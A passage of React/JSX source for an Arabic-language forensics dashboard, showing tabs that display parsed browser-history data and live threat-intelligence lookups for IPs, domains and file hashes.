                            <th className="p-3">النطاق</th>
                            <th className="p-3">عدد الزيارات</th>
                            <th className="p-3">تاريخ آخر زيارة</th>
                            <th className="p-3">المؤشر الأولي</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-gray-800">
                          {browserStaticResult.urls
                            .filter((u) => {
                              if (browserOnlyFlagged && u.riskHint === 'normal') return false;
                              if (!browserSearchQuery.trim()) return true;
                              const q = browserSearchQuery.toLowerCase();
                              return (
                                u.url.toLowerCase().includes(q) ||
                                u.title.toLowerCase().includes(q) ||
                                u.domain.toLowerCase().includes(q)
                              );
                            })
                            .slice(0, 300)
                            .map((u) => (
                              <tr key={u.id} className="hover:bg-gray-800/30">
                                <td className="p-3 max-w-md">
                                  <div className="font-bold text-white truncate" title={u.title}>{u.title}</div>
                                  <div className="text-[11px] font-mono text-gray-400 break-all select-all" dir="ltr">{u.url}</div>
                                </td>
                                <td className="p-3 font-mono text-[#D4AF37]" dir="ltr">{u.domain}</td>
                                <td className="p-3 font-mono text-gray-200 font-bold">{u.visitCount}</td>
                                <td className="p-3 font-mono text-gray-300 whitespace-nowrap">
                                  <div>{u.lastVisitFormatted}</div>
                                  {u.lastVisitIso && <div className="text-[10px] text-gray-500">{u.lastVisitIso}</div>}
                                </td>
                                <td className="p-3">
                                  <span
                                    className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
                                      u.riskHint === 'normal'
                                        ? 'bg-gray-800 text-gray-400'
                                        : 'bg-red-500/20 text-red-300 border border-red-500/30'
                                    }`}
                                  >
                                    {u.riskHint}
                                  </span>
                                </td>
                              </tr>
                            ))}
                        </tbody>
                      </table>
                      {browserStaticResult.urls.length === 0 && (
                        <div className="text-center py-8 text-xs text-gray-500">لم تُستخرج روابط ويب من الجداول الموجودة.</div>
                      )}
                    </div>
                  )}

                  {/* Sub-tab 2: Chronological Visits Timeline */}
                  {browserViewTab === 'visits' && (
                    <div className="overflow-x-auto max-h-[460px] overflow-y-auto">
                      <table className="w-full text-right text-xs">
                        <thead className="bg-gray-950 text-gray-400 sticky top-0 border-b border-gray-800">
                          <tr>
                            <th className="p-3">التاريخ والوقت الدقيق</th>
                            <th className="p-3">الموقع / الصفحة</th>
                            <th className="p-3">نوع الانتقال</th>
                            <th className="p-3">المدة</th>
                            <th className="p-3">المؤشر</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-gray-800">
                          {browserStaticResult.visits
                            .filter((v) => {
                              if (browserOnlyFlagged && v.riskHint === 'normal') return false;
                              if (!browserSearchQuery.trim()) return true;
                              const q = browserSearchQuery.toLowerCase();
                              return (
                                v.url.toLowerCase().includes(q) ||
                                v.title.toLowerCase().includes(q) ||
                                v.domain.toLowerCase().includes(q)
                              );
                            })
                            .slice(0, 300)
                            .map((v) => (
                              <tr key={v.id} className="hover:bg-gray-800/30">
                                <td className="p-3 font-mono text-emerald-400 whitespace-nowrap">
                                  <div>{v.visitFormatted}</div>
                                  {v.visitIso && <div className="text-[10px] text-gray-500">{v.visitIso}</div>}
                                </td>
                                <td className="p-3 max-w-md">
                                  <div className="font-bold text-white truncate">{v.title}</div>
                                  <div className="text-[11px] font-mono text-gray-400 break-all" dir="ltr">{v.url}</div>
                                </td>
                                <td className="p-3 text-gray-300">{v.transitionType}</td>
                                <td className="p-3 font-mono text-gray-400">
                                  {v.durationSeconds != null ? `${v.durationSeconds}ث` : '—'}
                                </td>
                                <td className="p-3">
                                  <span
                                    className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
                                      v.riskHint === 'normal'
                                        ? 'bg-gray-800 text-gray-400'
                                        : 'bg-red-500/20 text-red-300 border border-red-500/30'
                                    }`}
                                  >
                                    {v.riskHint}
                                  </span>
                                </td>
                              </tr>
                            ))}
                        </tbody>
                      </table>
                      {browserStaticResult.visits.length === 0 && (
                        <div className="text-center py-8 text-xs text-gray-500">لا توجد أحداث زيارات تفصيلية في جدول visits.</div>
                      )}
                    </div>
                  )}

                  {/* Sub-tab 3: Downloads */}
                  {browserViewTab === 'downloads' && (
                    <div className="space-y-2.5 max-h-[420px] overflow-y-auto">
                      {browserStaticResult.downloads.map((d) => (
                        <div key={d.id} className="p-4 bg-gray-950 rounded-xl border border-gray-800 flex flex-col md:flex-row md:items-center justify-between gap-3">
                          <div className="space-y-1">
                            <div className="flex items-center gap-2">
                              <span className="text-sm font-bold text-white font-mono" dir="ltr">{d.fileName}</span>
                              {d.isDangerousExtension && (
                                <span className="px-2 py-0.5 rounded bg-red-500/20 text-red-400 text-[10px] font-bold">ملف تنفيذي / خطر</span>
                              )}
                            </div>
                            <div className="text-[11px] font-mono text-gray-400 break-all" dir="ltr">URL: {d.url}</div>
                            <div className="text-[11px] font-mono text-gray-500 break-all" dir="ltr">Path: {d.targetPath}</div>
                          </div>
                          <div className="text-left md:text-right font-mono text-[11px] text-gray-400 shrink-0 space-y-1">
                            <div className="text-[#D4AF37]">{d.dangerType}</div>
                            <div>{formatFileSize(d.totalBytes || d.receivedBytes)} • {d.startTimeFormatted}</div>
                          </div>
                        </div>
                      ))}
                      {browserStaticResult.downloads.length === 0 && (
                        <div className="text-center py-8 text-xs text-gray-500">لا توجد سجلات تنزيل (downloads) في قاعدة البيانات.</div>
                      )}
                    </div>
                  )}

                  {/* Sub-tab 4: Search Terms */}
                  {browserViewTab === 'searches' && (
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3 max-h-[420px] overflow-y-auto">
                      {browserStaticResult.searchTerms.map((st, idx) => (
                        <div key={idx} className="p-3.5 bg-gray-950 rounded-xl border border-gray-800 space-y-1">
                          <div className="flex items-center justify-between gap-2">
                            <span className="text-sm font-bold text-[#D4AF37]">{st.term}</span>
                            <span className="text-[10px] font-mono text-gray-500">{st.visitTimeFormatted}</span>
                          </div>
                          <div className="text-[11px] font-mono text-gray-400 truncate" dir="ltr">{st.url}</div>
                        </div>
                      ))}
                      {browserStaticResult.searchTerms.length === 0 && (
                        <div className="col-span-2 text-center py-8 text-xs text-gray-500">لم تُسجل عبارات بحث في قاعدة البيانات.</div>
                      )}
                    </div>
                  )}

                  {/* Sub-tab 5: Raw SQLite Tables Schema */}
                  {browserViewTab === 'tables' && (
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3 max-h-[420px] overflow-y-auto">
                      {browserStaticResult.tables.map((t) => (
                        <div key={t.name} className="p-4 bg-gray-950 rounded-xl border border-gray-800 space-y-2">
                          <div className="flex items-center justify-between">
                            <span className="text-sm font-mono font-bold text-[#D4AF37]">{t.name}</span>
                            <span className="px-2 py-0.5 rounded bg-gray-800 text-gray-300 text-[10px] font-mono">
                              {t.rowCount} سجل
                            </span>
                          </div>
                          <div className="flex flex-wrap gap-1">
                            {t.columns.map((c) => (
                              <span key={c} className="px-1.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-[10px] font-mono text-gray-400">
                                {c}
                              </span>
                            ))}
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            )}

            {!browserStaticResult && !browserAnalyzing && (
              <div className="rounded-2xl bg-gray-900/50 border border-dashed border-gray-800 p-12 text-center space-y-3">
                <Database className="w-12 h-12 text-gray-600 mx-auto" />
                <h3 className="text-base font-bold text-gray-300">لم تقم برفع أي قاعدة بيانات متصفح بعد</h3>
                <p className="text-xs text-gray-500 max-w-xl mx-auto leading-relaxed">
                  اسحب وأفلت ملف <code className="text-[#D4AF37]">History</code> (Chrome/Edge) أو <code className="text-emerald-400">places.sqlite</code> (Firefox) أو <code className="text-blue-400">History.db</code> (Safari) لاستخراج الجداول والروابط وتواريخ الزيارات بدقة وتحليلها عبر وحدة Automated Parser Core.
                </p>
              </div>
            )}
          </div>
        )}

        {/* Tab: Global Threat Intelligence & Live OSINT Engine */}
        {isTabVisible('threat_intel') && (
          <div className="space-y-6">
            <div className="rounded-2xl bg-gradient-to-r from-gray-900 via-gray-900/95 to-gray-950 border-2 border-gray-800 p-8 shadow-2xl space-y-6">
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                <div className="space-y-2 max-w-3xl">
                  <div className="inline-flex items-center gap-2 px-3 py-1 rounded-lg bg-[#D4AF37]/10 border border-[#D4AF37]/30 text-[#D4AF37] text-xs font-mono">
                    <Globe className="w-3.5 h-3.5" />
                    GLOBAL THREAT INTELLIGENCE & LIVE OSINT ENGINE • THREAT HUNTING DAEMON v3.5
                  </div>
                  <h1 className="text-2xl md:text-3xl font-bold text-white">
                    محرك الاستخبارات السيبرانية العالمي (Global Threat Intelligence & Live OSINT)
                  </h1>
                  <p className="text-gray-400 text-sm leading-relaxed">
                    فحص مباشر وشامل لعناوين الـ IP، النطاقات (Domains)، وبصمات الملفات التشفيرية (MD5 / SHA-1 / SHA-256) بالربط الحي مع سجلات DNS وRDAP وGeoIP وشهادات TLS وقواعد بيانات السمعة العالمية عبر وحدة Threat Hunting OSINT Daemon v3.5، وتحديث قسم التهديدات وسجلات العمليات فوراً.
                  </p>
                </div>
                {threatIntelResult && (
                  <button
                    onClick={downloadThreatIntelJson}
                    className="px-4 py-3 bg-gray-800 hover:bg-gray-700 text-gray-200 text-xs font-bold rounded-xl border border-gray-700 transition flex items-center gap-2 shrink-0 self-start"
                  >
                    <Download className="w-4 h-4 text-[#D4AF37]" />
                    تصدير ملف الاستخبارات JSON
                  </button>
                )}
              </div>

              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  void runThreatIntelLookup();
                }}
                className="flex flex-col md:flex-row gap-3"
              >
                <div className="relative flex-1">
                  <input
                    type="text"
                    value={threatIntelInput}
                    onChange={(e) => setThreatIntelInput(e.target.value)}
                    placeholder="أدخل عنوان IP (مثل 8.8.8.8) أو نطاق (مثل github.com) أو Hash (SHA-256 / MD5)..."
                    dir="ltr"
                    className="w-full pl-36 pr-4 py-3.5 bg-gray-950 border border-gray-800 rounded-xl text-sm text-white font-mono focus:outline-none focus:border-[#D4AF37]"
                    required
                  />
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 px-2.5 py-1 rounded-lg bg-[#D4AF37]/15 border border-[#D4AF37]/30 text-[#D4AF37] text-[10px] font-mono font-bold">
                    {detectThreatInputBadge(threatIntelInput)}
                  </span>
                </div>
                <button
                  type="submit"
                  disabled={threatIntelLoading}
                  className="px-6 py-3.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl shadow-lg hover:opacity-95 transition flex items-center justify-center gap-2 text-sm disabled:opacity-50 shrink-0"
                >
                  {threatIntelLoading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
                  {threatIntelLoading ? 'جاري الاستعلام العالمي...' : 'فحص استخباراتي فوري'}
                </button>
              </form>

              {/* Quick Lookup Bar from Evidence SHA-256 or Standard Test Targets */}
              <div className="flex flex-wrap items-center gap-2 text-xs">
                <span className="text-gray-500">أمثلة وفحص سريع من الأدلة:</span>
                <button
                  type="button"
                  onClick={() => void runThreatIntelLookup('8.8.8.8')}
                  className="px-2.5 py-1 rounded-lg bg-gray-950 border border-gray-800 hover:border-[#D4AF37] text-gray-300 font-mono transition"
                >
                  8.8.8.8 (IPv4)
                </button>
                <button
                  type="button"
                  onClick={() => void runThreatIntelLookup('github.com')}
                  className="px-2.5 py-1 rounded-lg bg-gray-950 border border-gray-800 hover:border-[#D4AF37] text-gray-300 font-mono transition"
                >
                  github.com (Domain)
                </button>
                {evidenceList
                  .filter((ev) => ev.sha256 && /^[a-f0-9]{64}$/i.test(ev.sha256))
                  .slice(0, 2)
                  .map((ev) => (
                    <button
                      key={ev.id}
                      type="button"
                      onClick={() => void runThreatIntelLookup(ev.sha256)}
                      className="px-2.5 py-1 rounded-lg bg-gray-950 border border-emerald-500/30 hover:border-[#D4AF37] text-emerald-300 font-mono transition truncate max-w-[220px]"
                      title={`فحص بصمة ${ev.fileName}`}
                    >
                      Hash: {ev.fileName} ({ev.sha256.substring(0, 10)}...)
                    </button>
                  ))}
              </div>
            </div>

            {threatIntelLoading && (
              <div className="rounded-2xl bg-gray-900 border border-[#D4AF37]/40 p-10 text-center space-y-4">
                <RefreshCw className="w-10 h-10 text-[#D4AF37] animate-spin mx-auto" />
                <h3 className="text-lg font-bold text-white">
                  جاري الاتصال بالخوادم العالمية وسجلات DNS/RDAP/GeoIP والربط الاستخباراتي عبر Threat Hunting OSINT Daemon...
                </h3>
                <p className="text-xs text-gray-400 font-mono">
                  Live DNS • GeoIP/ASN • TLS Certificate Probe • MalwareBazaar / CIRCL Hashlookup • Threat Hunting Daemon v3.5
                </p>
              </div>
            )}

            {threatIntelError && (
              <div className="rounded-2xl bg-red-950/30 border border-red-500/40 p-5 flex items-start gap-3 text-red-300">
                <AlertOctagon className="w-6 h-6 shrink-0 mt-0.5 text-red-400" />
                <div className="space-y-1">
                  <div className="text-sm font-bold text-red-200">تشخيص حالة الاستعلام الاستخباراتي</div>
                  <p className="text-xs leading-relaxed font-mono break-all">{threatIntelError}</p>
                </div>
              </div>
            )}

            {threatIntelResult && (
              <div className="space-y-6">
                {/* Threat Intelligence Verdict Card */}
                {threatIntelResult.intelligence && (
                  <div
                    className={`rounded-2xl border p-6 space-y-5 shadow-2xl ${
                      threatIntelResult.intelligence.isMalicious ||
                      threatIntelResult.intelligence.riskLevel === 'حرج' ||
                      threatIntelResult.intelligence.riskLevel === 'مرتفع'
                        ? 'bg-gradient-to-br from-gray-900 via-gray-900 to-red-950/30 border-red-500/40'
                        : 'bg-gradient-to-br from-gray-900 via-gray-900 to-emerald-950/20 border-emerald-500/30'
                    }`}
                  >
                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-gray-800">
                      <div className="flex items-center gap-3">
                        <div
                          className={`w-12 h-12 rounded-xl flex items-center justify-center border ${
                            threatIntelResult.intelligence.isMalicious
                              ? 'bg-red-500/15 border-red-500/40 text-red-400'
                              : 'bg-emerald-500/15 border-emerald-500/40 text-emerald-400'
                          }`}
                        >
                          {threatIntelResult.intelligence.isMalicious ? (
                            <ShieldAlert className="w-6 h-6" />
                          ) : (
                            <ShieldCheck className="w-6 h-6" />
                          )}
                        </div>
                        <div>
                          <div className="flex flex-wrap items-center gap-2">
                            <h2 className="text-lg font-bold text-white font-mono" dir="ltr">
                              {threatIntelResult.telemetry?.indicator}
                            </h2>
                            <span className="px-2 py-0.5 rounded bg-gray-800 text-[#D4AF37] text-[10px] font-mono uppercase">
                              {threatIntelResult.telemetry?.indicatorType}
                            </span>
                          </div>
                          <p className="text-xs text-gray-400 font-mono">
                            Engine: {threatIntelResult.modelUsed} • Assessed: {formatTimestampSafe(threatIntelResult.analyzedAt)} • تم التحديث في قسم التهديدات وسجل العمليات
                          </p>
                        </div>
                      </div>
                      <div className="flex flex-wrap items-center gap-2">
                        <span
                          className={`px-3 py-1.5 rounded-xl text-xs font-bold border ${
                            threatIntelResult.intelligence.isMalicious
                              ? 'bg-red-500/20 text-red-300 border-red-500/40'
                              : threatIntelResult.intelligence.riskLevel === 'متوسط'
                              ? 'bg-amber-500/20 text-amber-300 border-amber-500/40'
                              : 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                          }`}
                        >
                          {threatIntelResult.intelligence.verdict} • الخطورة: {threatIntelResult.intelligence.riskLevel} ({threatIntelResult.intelligence.threatScore}/100)
                        </span>
                      </div>
                    </div>

                    {threatIntelResult.intelligence.threatCategories?.length > 0 && (
                      <div className="flex flex-wrap gap-2">
                        {threatIntelResult.intelligence.threatCategories.map((cat, idx) => (
                          <span
                            key={idx}
                            className="px-2.5 py-1 rounded-lg bg-gray-950 border border-gray-800 text-xs font-mono text-[#D4AF37]"
                          >
                            {cat}
                          </span>
                        ))}
                      </div>
                    )}

                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                        <div className="text-xs font-bold text-[#D4AF37]">التقييم الاستخباراتي التنفيذي</div>
                        <p className="text-sm text-gray-200 leading-relaxed whitespace-pre-wrap">
                          {threatIntelResult.intelligence.executiveSummary}
                        </p>
                      </div>
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                        <div className="text-xs font-bold text-emerald-400">تحليل الخوادم والبنية التحتية (Infrastructure & Records)</div>
                        <p className="text-sm text-gray-200 leading-relaxed whitespace-pre-wrap">
                          {threatIntelResult.intelligence.infrastructureAnalysis}
                        </p>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2.5">
                        <div className="text-xs font-bold text-blue-400">الحقائق الاستخباراتية المرصودة (OSINT Findings)</div>
                        <ul className="space-y-1.5">
                          {threatIntelResult.intelligence.osintFindings.map((f, idx) => (
                            <li key={idx} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800 flex items-start gap-2">
                              <span className="w-1.5 h-1.5 rounded-full bg-blue-400 mt-1.5 shrink-0" />
                              <span>{f}</span>
                            </li>
                          ))}
                        </ul>
                      </div>
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2.5">
                        <div className="text-xs font-bold text-[#D4AF37]">التوصيات الدفاعية والاستجابة</div>
                        <ul className="space-y-1.5">
                          {threatIntelResult.intelligence.recommendations.map((rec, idx) => (
                            <li key={idx} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800 flex items-start gap-2">
                              <CheckCircle2 className="w-3.5 h-3.5 text-[#D4AF37] mt-0.5 shrink-0" />
                              <span>{rec}</span>
                            </li>
                          ))}
                        </ul>
                      </div>
                    </div>

                    {threatIntelResult.sources?.length > 0 && (
                      <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                        <div className="text-xs font-bold text-gray-400">مصادر البحث المباشر والمراجع الاستخباراتية المفتوحة (Live OSINT Correlation)</div>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                          {threatIntelResult.sources.map((src, idx) => (
                            <a
                              key={idx}
                              href={sanitizeSafeHref(src.uri)}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="p-2.5 rounded-lg bg-gray-900 border border-gray-800 hover:border-[#D4AF37] text-xs text-[#D4AF37] flex items-center justify-between gap-2 transition"
                            >
                              <span className="truncate">{src.title}</span>
                              <ExternalLink className="w-3.5 h-3.5 shrink-0" />
                            </a>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* Live Technical Telemetry Grid (Server, Country, DNS, TLS, RDAP, Hash Feeds) */}
                {threatIntelResult.telemetry && (
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    {/* Server Geolocation & ASN */}
                    {threatIntelResult.telemetry.serverInfo && (
                      <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                        <h3 className="text-sm font-bold text-white flex items-center gap-2 pb-3 border-b border-gray-800">
                          <Server className="w-4 h-4 text-[#D4AF37]" />
                          معلومات الخادم والدولة والشبكة (Server & Geolocation)
                        </h3>
                        <div className="grid grid-cols-2 gap-3 text-xs">
                          <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                            <span className="text-[10px] text-gray-500 block">عنوان الخادم الأساسي (IP)</span>
                            <span className="font-mono font-bold text-[#D4AF37]" dir="ltr">
                              {threatIntelResult.telemetry.serverInfo.primaryIp || 'غير متوفر'}
                            </span>
                          </div>
                          <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                            <span className="text-[10px] text-gray-500 block">الدولة والمدينة</span>
                            <span className="font-bold text-white">
                              {threatIntelResult.telemetry.serverInfo.country || 'غير محدد'}{' '}
                              {threatIntelResult.telemetry.serverInfo.countryCode ? `(${threatIntelResult.telemetry.serverInfo.countryCode})` : ''}
                              {threatIntelResult.telemetry.serverInfo.city ? ` • ${threatIntelResult.telemetry.serverInfo.city}` : ''}
                            </span>
                          </div>
                          <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                            <span className="text-[10px] text-gray-500 block">رقم الشبكة المستقلة (ASN)</span>
                            <span className="font-mono text-emerald-400" dir="ltr">
                              {threatIntelResult.telemetry.serverInfo.asn || 'غير متوفر'}
                            </span>
                          </div>
                          <div className="bg-gray-950 p-3 rounded-xl border border-gray-800">
                            <span className="text-[10px] text-gray-500 block">المزود / المنظمة (ISP / Org)</span>
                            <span className="text-gray-200">
                              {threatIntelResult.telemetry.serverInfo.isp || threatIntelResult.telemetry.serverInfo.org || 'غير متوفر'}
                            </span>
                          </div>
                          <div className="bg-gray-950 p-3 rounded-xl border border-gray-800 col-span-2">
                            <span className="text-[10px] text-gray-500 block">Reverse DNS (PTR) & خصائص الاستضافة</span>
                            <span className="font-mono text-gray-300 block" dir="ltr">
                              {threatIntelResult.telemetry.serverInfo.reverseDns?.join(', ') || 'لا يوجد سجل PTR'}
                            </span>
                            <div className="flex flex-wrap gap-2 mt-1.5">
                              {threatIntelResult.telemetry.serverInfo.isHosting !== null && (
                                <span className="px-2 py-0.5 rounded bg-gray-900 border border-gray-800 text-[10px] text-gray-400">
                                  مركز بيانات/استضافة: {threatIntelResult.telemetry.serverInfo.isHosting ? 'نعم' : 'لا'}
                                </span>
                              )}
                              {threatIntelResult.telemetry.serverInfo.isProxyOrVpn !== null && (
                                <span className={`px-2 py-0.5 rounded border text-[10px] ${
                                  threatIntelResult.telemetry.serverInfo.isProxyOrVpn
                                    ? 'bg-amber-500/15 border-amber-500/30 text-amber-300'
                                    : 'bg-gray-900 border-gray-800 text-gray-400'
                                }`}>
                                  Proxy / VPN: {threatIntelResult.telemetry.serverInfo.isProxyOrVpn ? 'مرصود' : 'لا'}
                                </span>
                              )}
                            </div>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* DNS & TLS Records */}
                    {(threatIntelResult.telemetry.dnsRecords || threatIntelResult.telemetry.tlsCertificate) && (
                      <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                        <h3 className="text-sm font-bold text-white flex items-center gap-2 pb-3 border-b border-gray-800">
                          <Network className="w-4 h-4 text-[#D4AF37]" />
                          سجلات DNS الحية وشهادة SSL/TLS
                        </h3>
                        {threatIntelResult.telemetry.dnsRecords && (
                          <div className="space-y-2 text-xs font-mono" dir="ltr">
                            <div className="bg-gray-950 p-2.5 rounded-lg border border-gray-800">
                              <span className="text-[#D4AF37] font-bold">A: </span>
                              <span className="text-gray-300">{threatIntelResult.telemetry.dnsRecords.a?.join(', ') || '—'}</span>
                            </div>
                            <div className="bg-gray-950 p-2.5 rounded-lg border border-gray-800">
                              <span className="text-[#D4AF37] font-bold">NS: </span>
                              <span className="text-gray-300">{threatIntelResult.telemetry.dnsRecords.ns?.join(', ') || '—'}</span>
                            </div>
                            <div className="bg-gray-950 p-2.5 rounded-lg border border-gray-800">
                              <span className="text-[#D4AF37] font-bold">MX: </span>
                              <span className="text-gray-300">
                                {threatIntelResult.telemetry.dnsRecords.mx?.map((m: any) => `${m.exchange} (${m.priority})`).join(', ') || '—'}
                              </span>
                            </div>
                            <div className="bg-gray-950 p-2.5 rounded-lg border border-gray-800">
                              <span className="text-[#D4AF37] font-bold">TXT: </span>
                              <span className="text-gray-400 break-all">
                                {threatIntelResult.telemetry.dnsRecords.txt?.slice(0, 3).join(' | ') || '—'}
                              </span>
                            </div>
                          </div>
                        )}
                        {threatIntelResult.telemetry.tlsCertificate && (
                          <div className="bg-gray-950 p-3 rounded-xl border border-emerald-500/25 text-xs space-y-1">
                            <div className="font-bold text-emerald-400">شهادة التشفير الحية (TLS 443)</div>
                            <div className="font-mono text-gray-300" dir="ltr">
                              Subject: {threatIntelResult.telemetry.tlsCertificate.subjectCN || '—'} | Issuer: {threatIntelResult.telemetry.tlsCertificate.issuerO || threatIntelResult.telemetry.tlsCertificate.issuerCN || '—'}
                            </div>
                            <div className="font-mono text-[10px] text-gray-500" dir="ltr">
                              Valid: {threatIntelResult.telemetry.tlsCertificate.validFrom} → {threatIntelResult.telemetry.tlsCertificate.validTo}
                            </div>
                          </div>
                        )}
                      </div>
                    )}

                    {/* Hash Reputation Databases */}
                    {threatIntelResult.telemetry.hashTelemetry && (
                      <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                        <h3 className="text-sm font-bold text-white flex items-center gap-2 pb-3 border-b border-gray-800">
                          <Hash className="w-4 h-4 text-[#D4AF37]" />
                          نتائج فحص البصمة التشفيرية ({threatIntelResult.telemetry.hashTelemetry.algorithm})
                        </h3>
                        <div className="space-y-3 text-xs">
                          <div className={`p-3 rounded-xl border ${
                            threatIntelResult.telemetry.hashTelemetry.malwareBazaarFound
                              ? 'bg-red-950/30 border-red-500/40 text-red-300'
                              : 'bg-gray-950 border-gray-800 text-gray-300'
                          }`}>
                            <div className="font-bold">Abuse.ch MalwareBazaar</div>
                            {threatIntelResult.telemetry.hashTelemetry.malwareBazaarFound ? (
                              <div className="font-mono text-[11px] mt-1">
                                تطابق عينة خبيثة: {threatIntelResult.telemetry.hashTelemetry.malwareSignature || 'Unknown Family'} ({threatIntelResult.telemetry.hashTelemetry.fileType || 'Binary'}) • First Seen: {threatIntelResult.telemetry.hashTelemetry.firstSeen}
                              </div>
                            ) : (
                              <div className="text-[11px] text-gray-500 mt-1">غير مسجل كعينة خبيثة في MalwareBazaar.</div>
                            )}
                          </div>
                          <div className={`p-3 rounded-xl border ${
                            threatIntelResult.telemetry.hashTelemetry.circlKnownClean
                              ? 'bg-emerald-950/30 border-emerald-500/40 text-emerald-300'
                              : 'bg-gray-950 border-gray-800 text-gray-300'
                          }`}>
                            <div className="font-bold">CIRCL Hashlookup (NSRL Clean Software)</div>
                            {threatIntelResult.telemetry.hashTelemetry.circlKnownClean ? (
                              <div className="font-mono text-[11px] mt-1">
                                ملف موثوق معروف: {threatIntelResult.telemetry.hashTelemetry.circlFileName || ''} {threatIntelResult.telemetry.hashTelemetry.circlProduct || ''}
                              </div>
                            ) : (
                              <div className="text-[11px] text-gray-500 mt-1">غير مدرج في قاعدة بيانات البرمجيات القياسية NSRL.</div>
                            )}
                          </div>
                        </div>
                      </div>
                    )}

                    {/* Sources Status & RDAP */}
                    <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                      <h3 className="text-sm font-bold text-white flex items-center gap-2 pb-3 border-b border-gray-800">
                        <Activity className="w-4 h-4 text-[#D4AF37]" />
                        حالة المصادر والسجلات المستعلم منها (Live Sources)
                      </h3>
                      <div className="space-y-2">
                        {(threatIntelResult.telemetry.sourcesChecked || []).map((sc: any, idx: number) => (
                          <div key={idx} className="p-3 bg-gray-950 rounded-xl border border-gray-800 flex items-center justify-between gap-2 text-xs">
                            <div>
                              <div className="font-bold text-white">{sc.name}</div>
                              {sc.detail && <div className="text-[11px] font-mono text-gray-400">{sc.detail}</div>}
                            </div>
                            <span
                              className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase ${
                                sc.status === 'ok'
                                  ? 'bg-emerald-500/15 text-emerald-400'
                                  : sc.status === 'not_found'
                                  ? 'bg-gray-800 text-gray-400'
                                  : 'bg-amber-500/15 text-amber-300'
                              }`}
                            >
                              {sc.status}
                            </span>
                          </div>
                        ))}
                      </div>
                      {threatIntelResult.telemetry.rdapInfo && (
                        <div className="p-3 bg-gray-950 rounded-xl border border-gray-800 text-xs space-y-1">
                          <div className="font-bold text-[#D4AF37]">سجل التسجيل RDAP / WHOIS</div>
                          <div className="text-gray-300 font-mono text-[11px]" dir="ltr">
                            Handle: {threatIntelResult.telemetry.rdapInfo.handle || '—'} | CIDR: {threatIntelResult.telemetry.rdapInfo.cidr || '—'} | Registrar: {threatIntelResult.telemetry.rdapInfo.registrar || '—'}
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* Recent Threat Intel Scans History */}
            {threatIntelHistory.length > 0 && (
              <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                <h3 className="text-sm font-bold text-white">سجل الاستعلامات الاستخباراتية الأخيرة في هذه الجلسة</h3>
                <div className="overflow-x-auto">
                  <table className="w-full text-right text-xs">
                    <thead className="bg-gray-950 text-gray-400 border-b border-gray-800">
                      <tr>
                        <th className="p-3">المؤشر</th>
                        <th className="p-3">النوع</th>
                        <th className="p-3">الدولة / المزود</th>
                        <th className="p-3">التقييم</th>
                        <th className="p-3">درجة الخطورة</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-800">
                      {threatIntelHistory.map((h, i) => (
                        <tr
                          key={i}
                          onClick={() => {
                            setThreatIntelResult(h.fullPayload);
                            setThreatIntelInput(h.indicator);
                          }}
                          className="hover:bg-gray-800/30 cursor-pointer transition"
                        >
                          <td className="p-3 font-mono font-bold text-[#D4AF37]" dir="ltr">{h.indicator}</td>
                          <td className="p-3 font-mono text-gray-400 uppercase">{h.indicatorType}</td>
                          <td className="p-3 text-gray-300">{h.country} • {h.asn}</td>
                          <td className="p-3 text-white">{h.verdict}</td>
                          <td className="p-3">
                            <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                              h.isMalicious ? 'bg-red-500/20 text-red-300' : 'bg-emerald-500/15 text-emerald-300'
                            }`}>
                              {h.riskLevel} ({h.threatScore}/100)
                            </span>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Tab: Malicious Script & Payload Deobfuscator */}
        {isTabVisible('deobfuscator') && (
          <div className="space-y-6">
            <div className="rounded-2xl bg-gradient-to-r from-gray-900 via-gray-900/95 to-gray-950 border-2 border-gray-800 p-8 shadow-2xl space-y-6">
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
                <div className="space-y-2 max-w-3xl">
